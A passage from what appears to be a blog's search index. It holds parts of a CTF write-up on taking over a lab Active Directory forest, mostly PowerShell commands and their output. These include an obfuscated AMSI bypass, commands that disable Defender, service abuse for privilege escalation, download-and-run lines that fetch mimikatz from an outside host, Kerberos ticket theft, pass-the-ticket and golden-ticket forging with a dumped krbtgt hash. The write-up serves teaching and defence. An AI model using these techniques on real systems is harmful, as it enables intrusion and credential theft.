4872. PS C:\\Windows\\system32\\Tasks\u0026gt; a netpass window opens up and reveals the credentials:\nNEBULA\\devmanager:F0rRunning$cheduledTasks! PowerUp after gaining access via RDP to Prodsrv.Nebula.Cosmos.local as devmanager, i found that this account lacked local admin rights. privileges can be elevated by using PowerUp:\n.\\powerup.ps1 Invoke-AllChecks PS C:\\Users\\devmanager\u0026gt; cd .\\Desktop PS C:\\Users\\devmanager\\Desktop\u0026gt; ls Directory: C:\\Users\\devmanager\\Desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 6/23/2024 7:45 AM 562841 PowerUp.ps1 PS C:\\Users\\devmanager\\Desktop\u0026gt; . .\\PowerUp.ps1 PS C:\\Users\\devmanager\\Desktop\u0026gt; Invoke-AllChecks [*] Running Invoke-AllChecks [*] Checking if user is in a local group with administrative privileges... [*] Checking for unquoted service paths... [*] Checking service executable and argument permissions... [*] Checking service permissions... ServiceName : Browser Path : C:\\Windows\\System32\\svchost.exe -k smbsvcs StartName : LocalSystem AbuseFunction : Invoke-ServiceAbuse -Name \u0026#39;Browser\u0026#39; CanRestart : True [*] Checking %PATH% for potentially hijackable DLL locations... ModifiablePath : C:\\Users\\devmanager\\AppData\\Local\\Microsoft\\WindowsApps IdentityReference : NEBULA\\devmanager Permissions : {WriteOwner, Delete, WriteAttributes, Synchronize...} %PATH% : C:\\Users\\devmanager\\AppData\\Local\\Microsoft\\WindowsApps AbuseFunction : Write-HijackDll -DllPath \u0026#39;C:\\Users\\devmanager\\AppData\\Local\\Microsoft\\WindowsApps\\wlbsctrl.dll\u0026#39; [*] Checking for AlwaysInstallElevated registry key... looks like Browser service permissions can be exploited. this would allow me to modify the binPath, or the path to the service allowing the Browser service to point to an exe of my choosing.\nInvoke-serviceabuse -servicename browser -username nebula\\devmanager /add i then verified my privileges.\nnet localgroup Administrators Windows PowerShell Copyright (C) 2016 Microsoft Corporation. All rights reserved. PS C:\\Windows\\system32\u0026gt; S`eT-It`em ( \u0026#39;V\u0026#39;+\u0026#39;aR\u0026#39; + \u0026#39;IA\u0026#39; + (\u0026#39;b\u0026#39;+\u0026#39;lE:1\u0026#39;+\u0026#39;q2\u0026#39;) + (\u0026#39;uZ\u0026#39;+\u0026#39;x\u0026#39;) ) ( [TYpE](\u0026#34;{1}{0}\u0026#34;-F\u0026#39;F\u0026#39;,\u0026#39;rE\u0026#39;) ) ; ( GeT-VariaBle (\u0026#34;1Q2U\u0026#34;+\u0026#34;zX\u0026#34;) -VaL ).\u0026#34;A`ss`Embly\u0026#34;.\u0026#34;GET`TY`Pe\u0026#34;(( \u0026#34;{6}{3}{1}{4}{2}{0}{5}\u0026#34; -f\u0026#39;Util\u0026#39;,\u0026#39;A\u0026#39;,\u0026#39;Amsi\u0026#39;,\u0026#39;.Management.\u0026#39;,\u0026#39;utomation.\u0026#39;,\u0026#39;s\u0026#39;,\u0026#39;System\u0026#39; ) ).\u0026#34;g`etf`iElD\u0026#34;( ( \u0026#34;{0}{2}{1}\u0026#34; -f\u0026#39;amsi\u0026#39;,\u0026#39;d\u0026#39;,\u0026#39;InitFaile\u0026#39; ),(\u0026#34;{2}{4}{0}{1}{3}\u0026#34; -f \u0026#39;Stat\u0026#39;,\u0026#39;i\u0026#39;,\u0026#39;NonPubli\u0026#39;,\u0026#39;c\u0026#39;,\u0026#39;c,\u0026#39; )).\u0026#34;sE`T`VaLUE\u0026#34;( ${n`ULl},${t`RuE} ) PS C:\\Windows\\system32\u0026gt; Set-MpPreference -DisableBehaviorMonitoring $true PS C:\\Windows\\system32\u0026gt; Set-MpPreference -DisableIOAVProtection $true PS C:\\Windows\\system32\u0026gt; net localgroup administrators Alias name administrators Comment Administrators have complete and unrestricted access to the computer/domain Members ------------------------------------------------------------------------------- Administrator NEBULA\\devmanager NEBULA\\Domain Admins NEBULA\\prodadmin NEBULA\\serviceacct The command completed successfully. PS C:\\Windows\\system32\u0026gt; whoami nebula\\devmanager PS C:\\Windows\\system32\u0026gt; with local admin rights now applied on the production server, i\u0026rsquo;m now able to push forward to attack the domain controller!\ntarget 5 unconstrained delegation using the Get-NetComputer cmdlet, i can list computers with unconstrained delegation enabled.\nGet-NetComputer -unconstrained PS C:\\Windows\\system32\u0026gt; iex (iwr http://172.16.10.1/powerview.ps1 -usebasicparsing) PS C:\\Windows\\system32\u0026gt; Get-NetComputer -Unconstrained nebula-dc.nebula.cosmos.local prodsrv.nebula.cosmos.local unconstrained delegation allows users to access any services in a domain, meaning i can run mimikatz to export Kerberos tickets from the Prodsrv machine to a different machine.\nfirst, i\u0026rsquo;ll create a directory that will house the tickets.\nmkdir tickets then, export the tickets from the lsa process.\nInvoke-Mimikatz –Command \u0026#39;\u0026#34;sekurlsa::tickets /export\u0026#34;\u0026#39; PS C:\\Windows\\system32\u0026gt; cd c: PS C:\\Windows\\system32\u0026gt; cd / PS C:\\\u0026gt; cd C:\\Users\\devmanager\\Desktop PS C:\\Users\\devmanager\\Desktop\u0026gt; mkdir tickets Directory: C:\\Users\\devmanager\\Desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- d----- 7/3/2024 2:39 PM tickets PS C:\\Users\\devmanager\\Desktop\u0026gt; cd .\\tickets PS C:\\Users\\devmanager\\Desktop\\tickets\u0026gt; PS C:\\Users\\devmanager\\Desktop\\tickets\u0026gt; Invoke-Mimikatz -Command \u0026#39;\u0026#34;sekurlsa::tickets /export\u0026#34;\u0026#39; interestingly, there\u0026rsquo;s an Administrator ticket.\nLastWriteTime Length Name ------------- ------ ---- 7/3/2024 2:39 PM 1641 [0:31da8d]-2-0-60a10000-Administrator@krbtgt-NEBULA.COSMOS.LOCAL.kirbi 7/3/2024 2:39 PM 1705 [0:32ca4a]-0-0-40a50000-devmanager@ldap-nebula-dc.nebula.cosmos.local.kirbi 7/3/2024 2:39 PM 1751 [0:32ca4a]-0-1-40a50000-devmanager@LDAP-nebula-dc.nebula.cosmos.local.kirbi 7/3/2024 2:39 PM 1579 [0:32ca4a]-2-0-40e10000-devmanager@krbtgt-NEBULA.COSMOS.LOCAL.kirbi 7/3/2024 2:39 PM 1641 [0:357bef]-2-0-60a10000-Administrator@krbtgt-NEBULA.COSMOS.LOCAL.kirbi 7/3/2024 2:39 PM 1709 [0:3e4]-0-0-40a50000-PRODSRV$@cifs-nebula-dc.nebula.cosmos.local.kirbi 7/3/2024 2:39 PM 1583 [0:3e4]-2-0-60a10000-PRODSRV$@krbtgt-NEBULA.COSMOS.LOCAL.kirbi 7/3/2024 2:39 PM 1583 [0:3e4]-2-1-40e10000-PRODSRV$@krbtgt-NEBULA.COSMOS.LOCAL.kirbi 7/3/2024 2:39 PM 1755 [0:3e7]-0-0-40a50000-PRODSRV$@cifs-nebula-dc.nebula.cosmos.local.kirbi 7/3/2024 2:39 PM 1747 [0:3e7]-0-1-40a50000.kirbi 7/3/2024 2:39 PM 1709 [0:3e7]-0-2-40a50000-PRODSRV$@LDAP-nebula-dc.nebula.cosmos.local.kirbi 7/3/2024 2:39 PM 1755 [0:3e7]-0-3-40a50000-PRODSRV$@LDAP-nebula-dc.nebula.cosmos.local.kirbi 7/3/2024 2:39 PM 1583 [0:3e7]-2-0-60a10000-PRODSRV$@krbtgt-NEBULA.COSMOS.LOCAL.kirbi 7/3/2024 2:39 PM 1583 [0:3e7]-2-1-40e10000-PRODSRV$@krbtgt-NEBULA.COSMOS.LOCAL.kirbi injecting ticket into LSASS this ticket [0:31da8d]-2-0-60a10000-Administrator@krbtgt-NEBULA.COSMOS.LOCAL.kirbi can be injected into the LSASS by a \u0026ldquo;pass-the-ticket\u0026rdquo; technique.\nInvoke-Mimikatz -Command \u0026#39;\u0026#34;kerberos::ptt C:\\users\\devmanager\\desktop\\tickets\\[0:31da8d]-2-0-60a10000-Administrator@krbtgt-NEBULA.COSMOS.LOCAL.kirbi\u0026#34;\u0026#39; with the injected ticket, i established a PowerShell remote session to the Nebula Domain Controller:\n$Sess = New-PSSession -ComputerName Nebula-DC.Nebula.Cosmos.Local Enter-PSSession -Session $sess PS C:\\Users\\devmanager\\Desktop\\tickets\u0026gt; PS C:\\Users\\devmanager\\Desktop\\tickets\u0026gt; PS C:\\Users\\devmanager\\Desktop\\tickets\u0026gt; Invoke-Mimikatz -Command \u0026#39;\u0026#34;kerberos::ptt C:\\users\\devmanager\\desktop\\tickets\\[0;31da8d]-2-0-60a10000-Administrator@krbtgt-NEBULA.COSMOS.LOCAL.kirbi\u0026#34;\u0026#39; .#####. mimikatz 2.1.1 (x64) built on Nov 29 2018 12:37:56 .## ^ ##. \u0026#34;A La Vie, A L\u0026#39;Amour\u0026#34; - (oe.eo) ** Kitten Edition ** ## / \\ ## /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) ## \\ / ## \u0026gt; http://blog.gentilkiwi.com/mimikatz \u0026#39;## v ##\u0026#39; Vincent LE TOUX ( vincent.letoux@gmail.com ) \u0026#39;#####\u0026#39; \u0026gt; http://pingcosmos.com / http://mysmartlogon.com ***/ mimikatz(powershell) # kerberos::ptt C:\\users\\devmanager\\desktop\\tickets\\[0;31da8d]-2-0-60a10000-Administrator@krbtgt-NEBULA.COSMOS.LOCAL.kirbi * File: \u0026#39;C:\\users\\devmanager\\desktop\\tickets\\[0;31da8d]-2-0-60a10000-Administrator@krbtgt-NEBULA.COSMOS.LOCAL.kirbi\u0026#39;: OK PS C:\\Users\\devmanager\\Desktop\\tickets\u0026gt; $sess = New-PSSession -ComputerName nebula-dc.nebula.cosmos.local PS C:\\Users\\devmanager\\Desktop\\tickets\u0026gt; Enter-PSSession -Session $sess [nebula-dc.nebula.cosmos.local]: PS C:\\Users\\Administrator\\Documents\u0026gt; whoami nebula\\administrator [nebula-dc.nebula.cosmos.local]: PS C:\\Users\\Administrator\\Documents\u0026gt; hostname nebula-dc [nebula-dc.nebula.cosmos.local]: PS C:\\Users\\Administrator\\Documents\u0026gt; i now have command execution on the domain controller.\ntarget 6 forest domination recall that the parent and child domains have a two-way (bidirectional) trust relationship. this means that there are a couple of ways to escalate privileges to another domain within the same forest. i\u0026rsquo;m going to use the KRBTGT hash way.\ndumping the hash using mimikatz, i can dump the KRBTGT hash from the Nebula Domain Controller:\nInvoke-Mimikatz -Command \u0026#39;\u0026#34;lsadump::lsa /patch\u0026#34;\u0026#39; [nebula-dc.nebula.cosmos.local]: PS C:\\Users\\Administrator\\Documents\u0026gt; S`eT-It`em ( \u0026#39;V\u0026#39;+\u0026#39;aR\u0026#39; + \u0026#39;IA\u0026#39; + (\u0026#39;b\u0026#39;+\u0026#39;lE:1\u0026#39;+\u0026#39;q2\u0026#39;) + (\u0026#39;uZ\u0026#39;+\u0026#39;x\u0026#39;) ) ( [TYpE](\u0026#34;{1}{0}\u0026#34;-F\u0026#39;F\u0026#39;,\u0026#39;rE\u0026#39;) ) ; ( GeT-VariaBle (\u0026#34;1Q2U\u0026#34;+\u0026#34;zX\u0026#34;) -VaL ).\u0026#34;A`ss`Embly\u0026#34;.\u0026#34;GET`TY`Pe\u0026#34;(( \u0026#34;{6}{3}{1}{4}{2}{0}{5}\u0026#34; -f\u0026#39;Util\u0026#39;,\u0026#39;A\u0026#39;,\u0026#39;Amsi\u0026#39;,\u0026#39;.Management.\u0026#39;,\u0026#39;utomation.\u0026#39;,\u0026#39;s\u0026#39;,\u0026#39;System\u0026#39; ) ).\u0026#34;g`etf`iElD\u0026#34;( ( \u0026#34;{0}{2}{1}\u0026#34; -f\u0026#39;amsi\u0026#39;,\u0026#39;d\u0026#39;,\u0026#39;InitFaile\u0026#39; ),(\u0026#34;{2}{4}{0}{1}{3}\u0026#34; -f \u0026#39;Stat\u0026#39;,\u0026#39;i\u0026#39;,\u0026#39;NonPubli\u0026#39;,\u0026#39;c\u0026#39;,\u0026#39;c,\u0026#39; )).\u0026#34;sE`T`VaLUE\u0026#34;( ${n`ULl},${t`RuE} ) [nebula-dc.nebula.cosmos.local]: PS C:\\Users\\Administrator\\Documents\u0026gt; iex (iwr http://172.16.10.1/invoke-mimikatz.ps1 -usebasicparsing) [nebula-dc.nebula.cosmos.local]: PS C:\\Users\\Administrator\\Documents\u0026gt; Invoke-Mimikatz -Command \u0026#39;\u0026#34;lsadump::lsa /patch\u0026#34;\u0026#39; .#####. mimikatz 2.1.1 (x64) built on Nov 29 2018 12:37:56 .## ^ ##. \u0026#34;A La Vie, A L\u0026#39;Amour\u0026#34; - (oe.eo) ** Kitten Edition ** ## / \\ ## /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) ## \\ / ## \u0026gt; http://blog.gentilkiwi.com/mimikatz \u0026#39;## v ##\u0026#39; Vincent LE TOUX ( vincent.letoux@gmail.com ) \u0026#39;#####\u0026#39; \u0026gt; http://pingcosmos.com / http://mysmartlogon.com ***/ mimikatz(powershell) # lsadump::lsa /patch Domain : NEBULA / S-1-5-21-771755520-687805270-358672322 RID : 000001f4 (500) User : Administrator RID : 000001f5 (501) User : Guest RID : 000001f6 (502) User : krbtgt NTLM : a3a127f4537798da6586372093fdffb4 RID : 000001f7 (503) User : DefaultAccount here\u0026rsquo;s the hash i\u0026rsquo;m interested in.\nRID : 000001f6 (502) User : krbtgt NTLM : a3a127f4537798da6586372093fdffb4 forging the inter-realm TGT armed with this, i can then forge the inter-realm TGT. an inter-realm TGT is a special ticket given by a domain controller to a user attempting to access a service in a trusted domain. this TGT is encrypted with a shared key that both domains have agreed upon. the TGT is presented to the DC of the trusted domain to get a service ticket (TGS). once the inter-realm TGT is validated, the DC issues a TGS, that then grants the user access to the server. you can read more about Microsoft\u0026rsquo;s Trust Technologies here .\nusing PowerView, i can enumerate the domain SID and Enterprise Admins SID:\nGet-DomainSID Get-NetGroupMember -GroupName \u0026#34;Enterprise Admins\u0026#34; –Domain cosmos.local PS C:\\ad\\tools\u0026gt; PS C:\\ad\\tools\u0026gt; Get-Domainsid S-1-5-21-771755520-687805270-358672322 PS C:\\ad\\tools\u0026gt; Get-NetGroupMember -GroupName \u0026#34;enterprise admins\u0026#34; -Domain cosmos.local GroupDomain : cosmos.local GroupName : Enterprise Admins MemberDomain : cosmos.local MemberName : Administrator MemberSID : S-1-5-21-1458491649-1432147247-1990877046-500 IsGroup : False MemberDN : CN=Administrator,CN=Users,DC=cosmos,DC=local i can then forge my inter-realm TGT.\nInvoke-Mimikatz -Command \u0026#39;\u0026#34;kerberos::golden /user:Administrator /domain:nebula.cosmos.local /sid:\u0026lt;sid of the current domain\u0026gt; /sids:\u0026lt;SID of the Enterprise Admins group of parent domain\u0026gt; /krbtgt:\u0026lt;hash\u0026gt; /ticket: C:\u0026lt;path\u0026gt;\u0026#34;\u0026#39; PS C:\\ticket\u0026gt; iex (iwr http://172.16.10.1/invoke-mimikatz.ps1 -usebasicparsing) PS C:\\ticket\u0026gt; Invoke-Mimikatz -Command \u0026#39;\u0026#34;kerberos::golden /user:Administrator /domain:nebula.cosmos.local /sid:S-1-5-21-771755520-687805270-358672322 /sids:S-1-5-21-1458491649-1432147247-1990877046-500 /krbtgt:a3a127f4537798da6586372093fdffb4 /ticket: C:\\ticket\\krbtgt_tkt.kirbi\u0026#34;\u0026#39; .#####. mimikatz 2.1.1 (x64) built on Nov 29 2018 12:37:56 .## ^ ##. \u0026#34;A La Vie, A L\u0026#39;Amour\u0026#34; - (oe.eo) ** Kitten Edition ** ## / \\ ## /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) ## \\ / ## / \\ ## \u0026gt; http://blog.gentilkiwi.com/mimikatz \u0026#39;## v ##\u0026#39; Vincent LE TOUX ( vincent.letoux@gmail.com ) \u0026#39;#####\u0026#39; \u0026gt; http://pingcosmos.com / http://mysmartlogon.com ***/ mimikatz(powershell) # kerberos::golden /user:Administrator /domain:nebula.cosmos.local /sid:S-1-5-21-771755520-687805270-358672322 /sids:S-1-5-21-1458491649-1432147247-1990877046-500 /krbtgt:a3a127f4537798da6586372093fdffb4 /ticket: C:\\ticket\\krbtgt_tkt.kirbi User : Administrator Domain : nebula.cosmos.local (NEBULA) SID : S-1-5-21-771755520-687805270-358672322 User Id : 500 Groups Id : *513 512 520 518 519 Extra SIDs: S-1-5-21-1458491649-1432147247-1990877046-500 ; ServiceKey: a3a127f4537798da6586372093fdffb4 - rc4_hmac_nt Lifetime : 7/3/2024 3:15:08 PM ; 7/1/2031 3:15:08 PM ; 7/1/2031 3:15:08 PM -\u0026gt; Ticket : ticket.kirbi * PAC generated * PAC signed * EncTicketPart generated * EncTicketPart encrypted * KrbCred generated Final Ticket Saved to file ! PS C:\\ticket\u0026gt; ls Directory: C:\\ticket Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 7/3/2024 3:15 PM 1499 ticket.kirbi armed with this forged ticket, i injected it into our current session using the \u0026ldquo;Pass the Ticket\u0026rdquo; technique:\nInvoke-Mimikatz -Command \u0026#39;\u0026#34;kerberos::ptt C:\\ticket\\ticket.kirbi\u0026#34;\u0026#39; PS C:\\ticket\u0026gt; Invoke-Mimikatz -Command \u0026#39;\u0026#34;kerberos::ptt C:\\ticket\\krbtgt_tkt.kirbi\u0026#34;\u0026#39; .#####. mimikatz 2.1.1 (x64) built on Nov 29 2018 12:37:56 .## ^ ##. \u0026#34;A La Vie, A L\u0026#39;Amour\u0026#34; - (oe.eo) ** Kitten Edition ** ## / \\ ## /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) ## \\ / ## \u0026gt; http://blog.gentilkiwi.com/mimikatz \u0026#39;## v ##\u0026#39; Vincent LE TOUX ( vincent.letoux@gmail.com ) \u0026#39;#####\u0026#39; \u0026gt; http://pingcosmos.com / http://mysmartlogon.com ***/ mimikatz(powershell) # kerberos::ptt C:\\ticket\\krbtgt_tkt.kirbi * File: \u0026#39;C:\\ticket\\krbtgt_tkt.kirbi\u0026#39;: ERROR kuhl_m_kerberos_ptt_file ; kuhl_m_file_readData (0x00000002) PS C:\\ticket\u0026gt; Invoke-Mimikatz -Command \u0026#39;\u0026#34;kerberos::ptt C:\\ticket\\ticket.kirbi\u0026#34;\u0026#39; .#####. mimikatz 2.1.1 (x64) built on Nov 29 2018 12:37:56 .## ^ ##. \u0026#34;A La Vie, A L\u0026#39;Amour\u0026#34; - (oe.eo) ** Kitten Edition ** ## / \\ ## /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) ## \\ / ## \u0026gt; http://blog.gentilkiwi.com/mimikatz \u0026#39;## v ##\u0026#39; Vincent LE TOUX ( vincent.letoux@gmail.com ) \u0026#39;#####\u0026#39; \u0026gt; http://pingcosmos.com / http://mysmartlogon.com ***/ mimikatz(powershell) # kerberos::ptt C:\\ticket\\ticket.kirbi * File: \u0026#39;C:\\ticket\\ticket.kirbi\u0026#39;: OK just to confirm successful forest compromise, i attempted to access the C$ share on the Cosmos-DC:\nls \\\\cosmos-dc.cosmos.local\\c$ PS C:\\ticket\u0026gt; ls \\\\cosmos-dc.cosmos.local\\c$ Directory: \\\\cosmos-dc.cosmos.local\\c$ Mode LastWriteTime Length Name ---- ------------- ------ ---- d----- 7/29/2023 1:55 AM PerfLogs d-r--- 1/24/2023 9:35 PM Program Files d----- 7/16/2023 6:23 AM Program Files (x86) d-r--- 9/15/2023 5:55 AM Transcripts d-r--- 9/2/2023 11:20 PM Users d----- 8/21/2023 11:47 PM Windows PS C:\\ticket\u0026gt; successfully listing the contents of the C$ share on the Cosmos Domain Controller, demonstrates complete forest compromise!\n","date":"2024-09-27","permalink":"//localhost:1313/posts/cosmos-2/","section":"","summary":"","tags":[],"title":"cosmos, part 2: domain + forest compromise"},{"categories":[],"contents":"introduction corporate networks face a constant and ever-evolving array of threats. at the heart of many enterprise IT infrastructures lies Active Directory [AD]. this is a directory service developed by Microsoft that provides authentication (AuthC) and authorization (AuthZ) services. AD is ubiquitous because of its robust capabilities in managing users, groups, computers, and access to resources across large-scale networks.\nthis also makes it a prime target for attackers. a successful attack on an org\u0026rsquo;s AD can lead to data breaches, intellectual property theft, or complete takeover of the corporate infrastructure.\nred-teaming involves simulating real-world attacks on an org\u0026rsquo;s systems + networks. for AD environments, this means compromising user accounts, escalating privileges, moving laterally through the network, and ultimately gaining control over domain controllers. by emulating TTPs of actual threat actors, red-teaming helps orgs identify vulnerabilities, test detection + response, and strengthen their security posture.\ncorporate AD environments are typically set up in a hierarchical structure, often spanning multiple domains and forests to reflect the org-structure of the business. this complexity, while necessary for large enterprises, can introduce vulnerabilities if not properly managed. misconfigurations, overly permissive settings, or failures to follow principles of least privilege can create opportunities for attackers to exploit.\nthe real kicker is that because AD has an interconnected nature, a compromise in one part of the network can potentially lead to a full domain (or even forest) takeover.\nscenario the scenario here focuses on an on-prem AD environment. many organizations are now moving towards a fully cloud-based (or hybrid) environment, but on-prem AD remains prevalent in numerous enterprises due to regulatory requirements, legacy system dependencies, or specific business needs.\nhow would an attacker in this scenario gain their initial foothold? there are several ways in:\nphishing attacks: tricking employees into revealing credentials or executing malware.\nsocial engineering: manipulating employees to divulge sensitive information.\nexploiting external services: leveraging vulnerabilities in web apps, VPNs, or other services exposed to the internet.\npurchasing stolen credentials: gg ez.\nin this CTF, everyone already starts with access to a user account, thereby circumventing the initial breach step. this means i can focus solely on the post-exploitation phase: escalate privileges and move laterally.\nthe attack chain demonstrates how a minor foothold can be leveraged to compromise an entire AD forest. hopefully, by sharing and understanding these attack paths, the security community can learn to better defend against them.\nthe forest the target environment is set up as an AD forest named Cosmos.Local. a forest is the highest level of organization in AD and can contain one or more domains.\nin this case, we have two domains:\nCosmos.Local: the parent domain.\nNebula.Cosmos.Local: the child domain.\nthese domains are connected by a two-way trust relationship, also known as a \u0026ldquo;parent-child trust\u0026rdquo;. what this means is that the users from one domain can be granted access to resources in the other domain, and vice versa. these trust relationships are common in large orgs where different departments or subsidiaries need their own AD domains but still require a level of integration.\nthe machines User.Nebula.Cosmos.Local role: end-user workstation (typical employee computer). initial point of entry which simulates a compromised user account.\ndomain: Nebula.Cosmos.Local\nUatsrv.Nebula.Cosmos.Local role: UAT (User Acceptance Testing) Server. used for testing apps before they go into production. often has elevated privileges and looser security controls.\ndomain: Nebula.Cosmos.Local\nDevsrv.Nebula.Cosmos.Local role: development server. hosts dev environments + tools. may contain valuable source code and often has connections to other critical systems.\ndomain: Nebula.Cosmos.Local\nProdsrv.Nebula.Cosmos.Local role: production server. runs live business apps. critical asset with access to real data and often stringent security measures.\ndomain: Nebula.Cosmos.Local\nNebula-DC.Nebula.Cosmos.Local role: DC for Nebula.Cosmos.Local. manages AuthC + AuthZ for the Nebula child domain. prime target for attackers looking to control the entire child domain.\ndomain: Nebula.Cosmos.Local\nCosmos-DC.Cosmos.Local role: DC for Cosmos.Local [Forest Root]. this is the ultimate target. as the forest root domain controller, it has authority over all domains in the forest. compromising this grants control over the entire AD infrastructure.\nattack path gain a foothold on the user workstation.\nthen, move laterally to the UAT and Dev servers, exploiting their looser security.\nnext, leverage access to compromise the production server.\nabuse the production server\u0026rsquo;s privileges to attack the Nebula domain controller.\nfinally, exploit the trust relationship to compromise the Cosmos domain controller and the entire forest.\ntarget 1 initial access + privilege escalation the seemingly innocuous user workstation is the entry point into the network. in a typical enterprise environment, these workstations are the most numerous and often considered low-hanging fruit for attackers. employees use them for daily tasks and so they\u0026rsquo;re often less strictly controlled than servers.\nthe challenge is to elevate privileges and gather crucial information about the domain structure\u0026hellip;without raising any alarms.\nanother thing about workstations: they often have vulnerabilities, outdated software, and misconfigurations. they can also be treasure troves of information, like cached credentials.\nfirst, let\u0026rsquo;s disable AMSI (Antimalware Scan Interface). AMSI is designed to prevent malicious scripts from running, so i\u0026rsquo;ll have to write an obfuscated command to evade detection by signature-based security tools.\nPS C:\\bilal\\AD\u0026gt; sET-ItEM ( \u0026#39;V\u0026#39;+\u0026#39;aR\u0026#39; + \u0026#39;IA\u0026#39; + \u0026#39;blE:1q2\u0026#39; + \u0026#39;uZx\u0026#39; ) ( [TYpE](\u0026#34;{1}{0}\u0026#34;-F\u0026#39;F\u0026#39;,\u0026#39;rE\u0026#39; ) ) ; ( GeT-VariaBle ( \u0026#34;1Q2U\u0026#34; +\u0026#34;zX\u0026#34; ) -VaL ).\u0026#34;A`ss`Embly\u0026#34;.\u0026#34;GET`TY`Pe\u0026#34;(( \u0026#34;{6}{3}{1}{4}{2}{0}{5}\u0026#34; -f\u0026#39;Util\u0026#39;,\u0026#39;A\u0026#39;,\u0026#39;Amsi\u0026#39;,\u0026#39;.Management.\u0026#39;,\u0026#39;utomation.\u0026#39;,\u0026#39;s\u0026#39;,\u0026#39;System\u0026#39; )).\u0026#34;g`etf`iElD\u0026#34;( ( \u0026#34;{0}{2}{1}\u0026#34; -f\u0026#39;amsi\u0026#39;,\u0026#39;d\u0026#39;,\u0026#39;InitFaile\u0026#39; ),(\u0026#34;{2}{4}{0}{1}{3}\u0026#34; -f \u0026#39;Stat\u0026#39;,\u0026#39;i\u0026#39;,\u0026#39;NonPubli\u0026#39;,\u0026#39;c\u0026#39;,\u0026#39;c,\u0026#39; )).\u0026#34;sE`T`VaLUE\u0026#34;(${n`ULl},${t`RuE} ) now i can run my own tools without interference.\nnext, let\u0026rsquo;s change the execution policy.\nPS C:\\bilal\\AD\u0026gt; Powershell -ep bypass this launches PowerShell with the execution policy set to bypass. the execution policy is a safety feature that controls the conditions under which PowerShell loads configuration files + runs scripts. by bypassing it, scripts can be run without restrictions.\ni then used PowerUp to find vectors of privilege escalation. using it along with Invoke-AllChecks runs a series of checks to identify vectors like misconfigurations, vulnerable services, or unquoted service paths.\nPS C:\\bilal\\AD\u0026gt; .\\PowerUp.ps1 PS C:\\bilal\\AD\u0026gt; Invoke-AllChecks i get back an interesting piece of information.\nServiceName : vds Path : C:\\Windows\\System32\\vds.exe StartName : LocalSystem AbuseFunction : Invoke-ServiceAbuse -Name \u0026#39;vds\u0026#39; CanRestart : True let\u0026rsquo;s exploit this vulnerable service VDS to add our user bilal to the local Administrators group.\nPS C:\\bilal\\AD\u0026gt; Invoke-ServiceAbuse -ServiceName vds -UserName Nebula\\bilal this exploits a vulnerability in VDS (Virtual Disk Service). it modifies the service to run a command [net localgroup Administrators Nebula\\bilal /add] that will add my user to the Administrators group. this works because VDS runs with SYSTEM privileges.\nlogging back in so the changes take effect, i can verify:\nPS C:\\bilal\\AD\u0026gt; net localgroup Administrators -------------------------------------- Administrator Nebula\\Domain Admins Nebula\\bilal enumeration get the list of domain users.\nPS C:\\bilal\\AD\u0026gt; Get-NetUser | select samaccountname get the list of domain computers.\nPS C:\\bilal\\AD\u0026gt; Get-netcomputer get the list of domain groups.\nPS C:\\bilal\\AD\u0026gt; Get-netgroup Administrators Users Guests Print Operators Backup Operators Replicator Remote Desktop Users Network Configuration Operators Performance Monitor Users Performance Log Users Distributed COM Users IIS_IUSRS Cryptographic Operators Event Log Readers Certificate Service DCOM Access RDS Remote Access Servers RDS Endpoint Servers RDS Management Servers Hyper-V Administrators Access Control Assistance Operators Remote Management Users System Managed Accounts Group Storage Replica Administrators Domain Computers Domain Controllers Cert Publishers Domain Admins Domain Users Domain Guests Group Policy Creator Owners RAS and IAS Servers Server Operators Account Operators Pre-Windows 2000 Compatible Access Windows Authorization Access Group Terminal Server License Servers Allowed RODC Password Replication Group Denied RODC Password Replication Group Read-only Domain Controllers Cloneable Domain Controllers Protected Users Key Admins DnsAdmins DnsUpdateProxy SQLManagers check domain trusts.\nPS C:\\bilal\\AD\u0026gt; Get-NetDomainTrust SourceName TargetName TrustType TrustDirection ----------- ----------- ---------- --------------- Nebula.Cosmos.Local Cosmos.Local ParentChild Bidirectional before moving on, it\u0026rsquo;s important to run nslookup on each machine in the environment to collect their IP addresses. it\u0026rsquo;s also helpful to map out a graphical representation of the AD relationships, using BloodHound.\nPS C:\\bilal\\AD\u0026gt; cd .\\BloodHound-master\\BloodHound-master\\ PS C:\\ad\\tools\\BloodHound-master\\BloodHound-master\u0026gt; cd .\\Ingestors\\ PS C:\\ad\\tools\\BloodHound-master\\BloodHound-master\\Ingestors\u0026gt; . .\\SharpHound.ps1 PS C:\\ad\\tools\\BloodHound-master\\BloodHound-master\\Ingestors\u0026gt; Invoke-BloodHound -CollectionMethod All Initializing SharpHound at 10:49 PM on 7/3/2024 Resolved Collection Methods: Group, Sessions, LoggedOn, Trusts, ACL, ObjectProps, LocalGroups, SPNTargets, Container [+] Creating Schema map for domain NEBULA.COSMOS.LOCAL using path CN=Schema,CN=Configuration,DC=NEBULA,DC=COSMOS,DC=LOCAL PS C:\\ad\\tools\\BloodHound-master\\BloodHound-master\\Ingestors\u0026gt; Invoke-BloodHound -CollectionMethod LoggedOn Initializing SharpHound at 10:49 PM on 7/3/2024 Status: 68 objects finished (+68 68)/s -- Using 103 MB RAM Resolved Collection Methods: LoggedOn451 Compressing data to C:\\ad\\tools\\BloodHound-master\\BloodHound-master\\Ingestors\\20210703224909_BloodHound.zip [+] Creating Schema map for domain NEBULA.COSMOS.LOCAL using path CN=Schema,CN=Configuration,DC=NEBULA,DC=COSMOS,DC=LOCAL PS C:\\ad\\tools\\BloodHound-master\\BloodHound-master\\Ingestors\u0026gt; [!] Cache File Found! Loaded 119 Objects in cache SharpHound Enumeration Completed at 10:49 PM on 7/3/2024! Happy Graphing! [+] Pre-populating Domain Controller SIDS Status: 0 objects finished (+0) -- Using 104 MB RAM Status: 5 objects finished (+5 ∞)/s -- Using 105 MB RAM Enumeration finished in 00:00:00.1406833 Compressing data to C:\\ad\\tools\\BloodHound-master\\BloodHound-master\\Ingestors\\20210703224919_BloodHound.zip You can upload this file directly to the UI SharpHound Enumeration Completed at 10:49 PM on 7/3/2024! Happy Graphing! the All collection method would gather comprehensive data about the domain, while the LoggedOn method focuses on 